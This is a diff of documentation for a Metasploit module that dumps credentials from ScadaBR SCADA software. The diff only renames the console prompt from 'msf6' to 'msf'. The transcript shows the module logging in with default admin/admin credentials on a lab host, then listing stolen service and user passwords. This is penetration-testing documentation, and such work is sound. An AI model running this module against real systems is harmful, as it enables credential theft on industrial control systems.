@@ -48,14 +48,14 @@ Wordlist file to crack password hashes (default: `./data/unix_passwords.txt`)
 ## Scenarios
 
 ```
-msf6 > use auxiliary/admin/http/scadabr_credential_dump 
-msf6 auxiliary(admin/http/scadabr_credential_dump) > set rhosts 172.16.191.194
+msf > use auxiliary/admin/http/scadabr_credential_dump 
+msf auxiliary(admin/http/scadabr_credential_dump) > set rhosts 172.16.191.194
 rhosts => 172.16.191.194
-msf6 auxiliary(admin/http/scadabr_credential_dump) > set username admin
+msf auxiliary(admin/http/scadabr_credential_dump) > set username admin
 username => admin
-msf6 auxiliary(admin/http/scadabr_credential_dump) > set password admin
+msf auxiliary(admin/http/scadabr_credential_dump) > set password admin
 password => admin
-msf6 auxiliary(admin/http/scadabr_credential_dump) > run
+msf auxiliary(admin/http/scadabr_credential_dump) > run
 [*] Running module against 172.16.191.194
 
 [+] 172.16.191.194:8080 Authenticated successfully as 'admin'
@@ -91,7 +91,7 @@ ScadaBR Service Credentials
  SMTP        127.0.0.1  25    smtptestuser   smtptestpass
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/scadabr_credential_dump) > creds
+msf auxiliary(admin/http/scadabr_credential_dump) > creds
 Credentials
 ===========
 
@@ -103,6 +103,6 @@ host            origin          service          public    private   realm  priv
 172.16.191.194  172.16.191.194  8080/tcp (http)  user      A                Password
 172.16.191.194  172.16.191.194  8080/tcp (http)  zxcv      zxcv             Password
 
-msf6 auxiliary(admin/http/scadabr_credential_dump) > 
+msf auxiliary(admin/http/scadabr_credential_dump) > 
 ```
 
